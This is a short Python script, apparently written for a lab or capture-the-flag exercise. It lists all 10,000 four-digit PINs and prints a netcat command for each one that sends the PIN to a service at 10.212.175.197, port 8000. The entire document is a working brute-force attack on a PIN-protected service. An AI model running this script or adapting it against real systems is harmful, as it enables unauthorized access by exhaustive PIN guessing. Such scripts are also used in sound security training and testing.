from itertools import product

nums = "0123456789"

pin_tries = product(nums, repeat=4)

for pin in pin_tries:
    pin = "".join(pin)
    print(f"echo {pin} | nc 10.212.175.197 8000")

